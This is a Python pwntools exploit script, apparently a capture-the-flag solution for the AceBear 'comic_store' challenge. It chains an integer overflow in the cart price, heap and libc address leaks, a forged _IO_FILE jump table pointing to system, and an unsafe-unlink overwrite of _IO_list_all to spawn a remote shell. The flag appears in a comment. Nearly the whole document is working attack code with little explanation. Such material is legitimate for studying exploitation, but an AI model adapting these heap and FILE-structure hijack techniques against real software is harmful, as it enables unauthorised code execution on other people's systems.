#!/usr/bin/python
from pwn import *
import sys

HOST = "comicstore.acebear.site"
PORT = 3005

def register(name):
	r.sendline("1")
	r.sendafter("name: ", name)
	r.recvuntil("Your choice: ")

def show_list():
	r.sendline("2")
	LEAK = r.recvuntil("********************Comic Store*****************", drop=True)
	r.recvuntil("Your choice: ")

	return LEAK

def add_to_cart(name, quantity):
	r.sendline("3")
	r.sendafter("comic: ", name)
	r.sendafter("Quantity: ", str(quantity))
	r.recvuntil("Your choice: ")

def get_user_info(content_count=0):
	r.sendline("4")
	r.recvuntil("Your choice: ")
	r.sendline("1")
	r.recvuntil("Name:        *")
	name = r.recvuntil(" *", drop=True).strip()
	r.recvuntil("Money:       *")
	money = r.recvuntil(" *", drop=True).strip()

	contlist = []

	for i in range(content_count):
		r.recvuntil("Content %d:" % i)
		r.recvuntil("*")
		contlist.append(r.recvuntil(" *", drop=True).strip())

	r.recvuntil("Your choice: ")
	r.sendline("4")
	r.recvuntil("Your choice: ")

	return name, money, contlist

def rename(new_name):
	r.sendline("4")
	r.recvuntil("Your choice: ")
	r.sendline("2")
	r.sendafter("name: ", new_name)	
	r.recvuntil("Your choice: ")
	r.sendline("4")
	r.recvuntil("Your choice: ")

def feedback(type, content):
	r.sendline("4")
	r.recvuntil("Your choice: ")
	r.sendline("3")
	r.sendafter("choice: ", str(type))	
	r.sendafter(": ", content)
	r.recvuntil("Your choice: ")
	r.sendline("4")
	r.recvuntil("Your choice: ")

def remove_comic(name, quantity):
	r.sendline("5")
	r.recvuntil("Your choice: ")
	r.sendline("2")
	r.sendafter("comic: ", name)
	r.sendafter("Quantity: ", str(quantity))
	r.recvuntil("Your choice: ")
	r.sendline("3")
	r.recvuntil("Your choice: ")

def checkout():
	r.sendline("6")
	r.sendlineafter("no) ", "1")
	r.recvuntil("Your choice: ")

def cheat_money(COMIC, PRICE, CUR_MONEY):
	add_to_cart(COMIC, (0xffffffff / PRICE) + 1)	

	remove_comic(COMIC, (0xffffffff / PRICE) - (CUR_MONEY/PRICE))

	checkout()

# AceBear{pl3ase_read_comic_wh3n_u_h4ve_fr33_tim3}

def exploit(r):
	r.recvuntil("Your choice: ")

	register("A"*256)

	log.info("Increase money by overflowing cart price.")
	cheat_money("Conan", 31000, 300000 )
	
	log.info("Free Ninja comic to prepare heap leak (and reduce Conan comic count to 1).")
	add_to_cart("Ninja Rantaro", 1000000)	
	add_to_cart("Conan", 999990-1)		
	checkout()

	log.info("Rename user to leak heap address from freed Ninja Rantaro chunk.")
	rename("A")

	log.info("Create (big) feedback in user object to leak libc.")
	feedback(2, "A")

	name, desc, content = get_user_info(1)

	HEAP = u64(("\x00"+name[1:]).ljust(8, "\x00")) - 0x200
	MAIN_ARENA = u64(("\x00"+content[0][1:]).ljust(8, "\x00"))+0x78
	libc.address = MAIN_ARENA - 0x3c4b78

	log.info("HEAP         : %s" % hex(HEAP))
	log.info("MAIN_ARENA   : %s" % hex(MAIN_ARENA))
	log.info("LIBC         : %s" % hex(libc.address))

	log.info("Prepare fake file table on heap via feedback")
	payload = "/bin/sh\x00" + p64(0)              # flags / _IO_read_ptr
	payload += p64(0) + p64(0)                    # _IO_read_end     / _IO_read_base	
	payload += p64(0) + p64(1)                    # _IO_write_base   / _IO_write_ptr
	payload += p64(0) + p64(0)                    # _IO_write_end
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(HEAP+0x568-0x18)          # <= Jump table (pointing also to this line)
	payload += p64(0) + p64(libc.symbols["system"])   # _IO_new_file_overflow (Jump table + 0x18)

	feedback(2, payload)                              # Write fake _IO_file into heap

	log.info("Buy remaining conan comic to create another freed comic chunk")

	add_to_cart("Dragon Ball", 1)	# Put random comic into first cart item entry
	add_to_cart("Conan", 1)         # Put remaining conan comic into second cart item entry
	checkout()

	log.info("Overwrite freed conan comic chunk with fake chunk to prepare unsafe unlink")

	payload = p64(HEAP+0x70)					# Comic entry (points to a comic with quantity 0)
	payload += p64(HEAP+0x480)					# Prev
	payload += p64(libc.address+0x3c5520-8)		# Next (overwrite IO_list_all)

	feedback(1, payload)

	log.info("Put random comic into slot 1 and checkout again to trigger unsafe unlink")
	add_to_cart("Dragon Ball", 1)

	checkout()

	log.info("Exit to trigger _IO_new_file_overflow => system('/bin/sh')")
	r.sendline("7")

	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./comic_store")
	libc = ELF("./libc.6")

	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./comic_store", env={"LD_PRELOAD" : "./libc.6"})		
		print util.proc.pidof(r)
		pause()
		exploit(r)
